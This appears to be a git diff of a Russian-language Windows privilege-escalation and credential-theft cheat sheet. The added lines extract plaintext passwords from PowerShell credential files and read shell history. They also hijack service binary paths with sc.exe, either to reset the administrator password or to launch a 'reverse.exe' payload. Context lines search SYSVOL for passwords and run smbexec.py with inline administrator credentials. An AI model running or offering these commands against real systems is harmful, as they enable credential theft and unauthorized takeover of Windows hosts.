@@ -21,6 +21,20 @@ wmic product get name
 
     findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config *.vbs
     
+# Учетные данные PowerShell (DPAPI)
+
+    $credObject = Import-Clixml -Path "C:\path\to\file.xml"
+    $plainPassword = $credObject.GetNetworkCredential().Password
+    Write-Output "Username: $($credObject.UserName)"
+    Write-Output "Password: $plainPassword"
+
+# Файл истории PowerShell
+
+    (Get-PSReadLineOption).HistorySavePath
+    gc (Get-PSReadLineOption).HistorySavePath
+
+# Файлы автоматической установки
+    Unattend.xml
 
 # Поиск строк в реестре
 
@@ -97,16 +111,65 @@ netstat -ano | findstr "6563"
     ps
 
     Get-Process
----------Перечисление запущенных служб 
-
-    get-service | ? {$_.DisplayName -like 'Druva*'}
+ 
 
 --------------Залогиненные пользователи
 
 query user
 
-----------------------------
-https://github.com/PowerShellMafia/PowerSploit      ---- Powersploit
+----------------------------Сервисы Windows
+
+Get-Service
+
+get-service | ? {$_.DisplayName -like 'Druva*'}
+
+sc query state=all
+
+get-wmiobject win32_service
+
+Set-Location 'HKLM:\SYSTEM\CurrentControlSet\Services'
+
+cd HKLM:\system\currentcontrolset\services> set-location 'hklm:\system\currentcontrolset\services' ----- перейтив в ветку где все службы
+
+get-childiem . ---- получить список служб
+
+Get-ChildItem . | select name --- получить все имена служб
+Service abusing
+
+net stop UniFiVideoService
+
+get-childitem UniFiVideoService
+
+get-childitem . | Where-Object {$_.Name -like '*UniFiVideoService'}
+
+cd 'HKLM:\system\currentcontrolset\services'> get-childitem . | where-object {$_.Name -like 'MTsensor'} ----- определить название службы
+
+stop-service 'Ubiquiti UniFi Video'
+
+start-service 'Ubiquiti UniFi Video'
+
+sc.exe stop browser
+
+sc.exe start browser
+
+sc.exe config browser binpath="C:\Windows\system32\cmd.exe /c net user administrator Password321123"
+
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
+
+C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc - проверка разрешений доступа к слжбам виндовс
+
+sc.exe qc daclsvc - используется для получения информации о конфигурации и параметрах обслуживания приложения DAclSvc
+
+sc.exe query daclsvc - информация о состянии службы (старт, стоп)
+
+------Если есть группа и привелегии по управлению сервисами --->>>
+
+sc config vss binpath= ""C:\PrivEsc\reverse.exe"" - смена пути к файлу сервиса
+
+sc.exe stop vss sc.exe start vss
+
+
+---------------------https://github.com/PowerShellMafia/PowerSploit      ---- Powersploit
 
 Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
 
@@ -484,53 +547,6 @@ psexec -i \\\adress -u user cmd
 python smbexec.py ignite/administrator:Ignite@987@192.168.1.105
 
 ***************************************************************************************************************************************************
-
-
-# Сервисы Windows
-
-Get-Service
-
-sc query state=all
-
-get-wmiobject win32_service
-
-Set-Location 'HKLM:\SYSTEM\CurrentControlSet\Services'
-
-cd HKLM:\system\currentcontrolset\services> set-location 'hklm:\system\currentcontrolset\services'    ----- перейтив в ветку где все службы
-
-get-childiem .    ---- получить список служб
-
-Get-ChildItem . | select name    --- получить все имена служб
-
-# Service abusing
-
-net stop UniFiVideoService
-
-get-childitem UniFiVideoService
-
-get-childitem . | Where-Object {$_.Name -like '*UniFiVideoService'}
-
-cd 'HKLM:\system\currentcontrolset\services'> get-childitem . | where-object {$_.Name -like '*MTsensor*'}    ----- определить название службы
-
-stop-service 'Ubiquiti UniFi Video'
-
-start-service 'Ubiquiti UniFi Video'
-
-sc.exe stop browser
-
-sc.exe start browser
-
-sc.exe config browser binpath="C:\Windows\system32\cmd.exe /c net user administrator Password321123"
-
-
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
-
-C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc - проверка разрешений доступа к слжбам виндовс 
-
-sc.exe qc daclsvc - используется для получения информации о конфигурации и параметрах обслуживания приложения DAclSvc 
-
-sc.exe query daclsvc - информация о состянии службы (старт, стоп)
-
 
 
 
